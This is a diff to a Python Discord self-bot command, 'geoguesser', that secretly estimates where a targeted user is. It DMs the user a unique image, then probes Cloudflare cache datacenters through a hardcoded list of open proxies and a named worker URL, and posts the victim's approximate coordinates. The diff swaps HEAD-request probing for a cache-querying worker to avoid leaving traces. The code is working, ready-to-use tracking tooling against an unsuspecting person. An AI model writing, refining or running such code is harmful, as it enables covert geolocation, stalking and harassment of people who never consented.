@@ -1,10 +1,9 @@
 """
 geoguesser.py – !geoguesser <@user>
 Generates a unique random image, sends it to a target user,
-then uses Cloudflare cache enumeration via proxy scanner
-(HEAD requests, no pre‑caching) to estimate location.
-Shows a live progress bar with animated spinner.
-Works with user accounts (no embeds).
+then queries a Cache‑API worker via global proxies to find
+the Cloudflare colo where the image is cached.
+No cache pollution – only the target's download creates a cache entry.
 """
 
 import asyncio
@@ -19,6 +18,7 @@ import math
 import traceback
 
 # ============ CONFIGURATION ============
+WORKER_URL = "https://shiny-lab-d8d2.zkutchinsky4413.workers.dev"
 WAIT_SECONDS = 25
 # =======================================
 
@@ -45,7 +45,7 @@ COLO_COORDS = {
     'HOU': {'lat': 29.7604, 'lon': -95.3698, 'name': 'Houston, TX'},
 }
 
-# Curated list of HTTPS‑capable proxies
+# Curated list of HTTPS‑capable proxies (from your earlier list)
 PROXY_LIST = [
     "212.113.104.29:10801","213.176.113.24:50001","43.167.173.109:8080","139.99.95.120:8080",
     "79.137.78.133:8002","64.188.77.26:3128","147.45.60.252:1081","79.133.180.232:10808",
@@ -102,14 +102,13 @@ def haversine(lat1, lon1, lat2, lon2):
     a = math.sin(dlat/2)**2 + math.cos(lat1) * math.cos(lat2) * math.sin(dlon/2)**2
     return R * 2 * math.asin(math.sqrt(a))
 
-async def scan_via_proxies(image_url):
+async def scan_via_proxies_and_worker(image_url):
     """
-    Use the internal proxy list to probe the image URL from different locations
-    using HEAD requests to avoid caching the resource.
-    Returns a dict with the same structure as the worker.
-    Never raises an exception; returns partial/empty data on failure.
+    Query our Cache‑API worker through each proxy.
+    The worker checks its local colo's cache without fetching the image.
+    Returns merged results from all proxies.
     """
-    results = []
+    worker_query_url = f"{WORKER_URL}?url={image_url}"
     sem = asyncio.Semaphore(20)
 
     async def fetch_one(proxy):
@@ -117,32 +116,42 @@ async def scan_via_proxies(image_url):
             try:
                 proxy_url = f"http://{proxy}"
                 async with aiohttp.ClientSession() as session:
-                    # HEAD request – does not download the body, does not create cache entry
-                    async with session.head(image_url, proxy=proxy_url,
-                                            timeout=aiohttp.ClientTimeout(total=10)) as resp:
-                        cf_ray = resp.headers.get('cf-ray', '')
-                        cache_status = resp.headers.get('cf-cache-status', 'MISS')
-                        colo = cf_ray.split('-')[-1] if '-' in cf_ray else 'UNKNOWN'
-                        return (colo, cache_status)
+                    async with session.get(worker_query_url, proxy=proxy_url,
+                                           timeout=aiohttp.ClientTimeout(total=10)) as resp:
+                        if resp.status == 200:
+                            data = await resp.json()
+                            return data
             except Exception:
-                return None
+                pass
+            return None
 
     tasks = [fetch_one(p) for p in PROXY_LIST]
-    raw_responses = await asyncio.gather(*tasks)
+    responses = await asyncio.gather(*tasks)
 
+    # Merge all successful responses
+    datacenters = []
     full_results = []
-    for proxy, res in zip(PROXY_LIST, raw_responses):
-        if res is not None:
-            colo, status = res
-            full_results.append({"colo": colo, "status": status, "hit": status == "HIT"})
+    for data in responses:
+        if data:
+            dcs = data.get('datacenters', [])
+            for dc in dcs:
+                if dc not in datacenters:
+                    datacenters.append(dc)
+            full_results.extend(data.get('full_results', []))
         else:
             full_results.append({"colo": "UNKNOWN", "status": "ERROR", "hit": False})
 
-    datacenters = list(set(r['colo'] for r in full_results if r['hit']))
+    # Also record proxy failures as unknowns
+    total_proxies = len(PROXY_LIST)
+    recorded = len(full_results)
+    for _ in range(recorded, total_proxies):
+        full_results.append({"colo": "UNKNOWN", "status": "ERROR", "hit": False})
+
+    hits = len(datacenters)
     return {
         "url": image_url,
-        "checked": len(full_results),
-        "hits": len(datacenters),
+        "checked": total_proxies,
+        "hits": hits,
         "datacenters": datacenters,
         "full_results": full_results
     }
@@ -175,7 +184,7 @@ async def run(client, message, args):
         "Upload to Discord CDN",
         "Send image to target",
         f"Wait {WAIT_SECONDS}s for target to load image",
-        "Enumerate cache (HEAD requests via proxies)"
+        "Enumerate cache (Cache‑API worker via proxies)"
     ]
 
     async def _update_progress(step=None, extra=None, spinner_char=None):
@@ -211,14 +220,10 @@ async def run(client, message, args):
             print(f"[GeoGuesser] Progress update failed: {e}")
 
     try:
-        # Step 0
         await _update_progress(0)
-
-        # Step 1: Generate image
         img_bytes = generate_random_image()
         await _update_progress(1)
 
-        # Step 2: Upload to Discord CDN
         try:
             sent = await message.channel.send(file=discord.File(img_bytes, filename="geo.png"))
             if not sent.attachments:
@@ -234,7 +239,6 @@ async def run(client, message, args):
             await message.channel.send(f"❌ Failed to upload image: {e}")
             return
 
-        # Step 3: DM image to target
         await _update_progress(2, extra=["📤 Sending DM..."])
         img_bytes.seek(0)
         try:
@@ -247,7 +251,6 @@ async def run(client, message, args):
             await message.channel.send(f"❌ DM failed: {e}")
             return
 
-        # Step 4: Wait with animated spinner
         spinner_chars = ["o", "0"]
         spinner_index = 0
         wait_remaining = WAIT_SECONDS
@@ -258,28 +261,22 @@ async def run(client, message, args):
             spinner_index = (spinner_index + 1) % 2
             await asyncio.sleep(1)
             wait_remaining -= 1
-        await _update_progress(4, extra=["✅ Wait complete. Scanning caches..."], spinner_char="o")
+        await _update_progress(4, extra=["✅ Wait complete. Scanning..."], spinner_char="o")
 
-        # Step 5: Enumerate cache using only proxy scanner (HEAD requests)
-        data = await scan_via_proxies(image_url)
+        # The magic: query our own worker through proxies
+        data = await scan_via_proxies_and_worker(image_url)
         await _update_progress(4, extra=["🔍 Cache scan complete."])
 
-        # Extract results
         datacenters = data.get('datacenters', [])
         hits = data.get('hits', 0)
         checked = data.get('checked', 0)
         full_results = data.get('full_results', [])
 
-        raw_json = json.dumps(data, indent=2)
-        if len(raw_json) > 1000:
-            raw_json = raw_json[:1000] + "\n... (truncated)"
-
-        # Build final text
         lines = []
         lines.append("**📍 GeoGuesser – Location Estimate**")
         lines.append(f"**Target:** {target.name}")
         lines.append(f"**Image URL:** {image_url}")
-        lines.append("**Method:** HEAD requests via proxies (no pre‑caching)")
+        lines.append("**Method:** Cache‑API worker via global proxies (no cache pollution)")
         lines.append(f"**Datacenters with HIT:** {len(datacenters)}")
         if not datacenters:
             lines.append("**Estimated radius:** N/A (no cache hits)")
@@ -301,11 +298,11 @@ async def run(client, message, args):
                 lines.append(f"**🌐 HIT Datacenters:** {', '.join(colo_names)}")
                 lines.append(f"**📍 Center:** {center_lat:.4f}, {center_lon:.4f}")
             else:
-                lines.append("**Estimated radius:** N/A (unknown datacenters)")
                 lines.append(f"**🌐 HIT Datacenters:** {', '.join(datacenters)}")
 
         lines.append(f"**📊 Scan Stats:** Checked: {checked} / Hits: {hits}")
 
+        # Scanned colos summary
         probed_colos = []
         seen = set()
         for r in full_results:
@@ -318,11 +315,14 @@ async def run(client, message, args):
             colos_text += f"\n... and {len(probed_colos)-12} more"
         lines.append(f"**🔬 Scanned Colos:**")
         lines.append(f"```\n{colos_text}\n```")
+
+        raw_json = json.dumps(data, indent=2)
+        if len(raw_json) > 1000:
+            raw_json = raw_json[:1000] + "\n... (truncated)"
         lines.append(f"**📄 Raw Data:**")
         lines.append(f"```json\n{raw_json}\n```")
 
         final_text = "\n".join(lines)
-
         await _update_progress(total_steps, extra=["✅ All done. See results below."])
         try:
             await status_msg.delete()
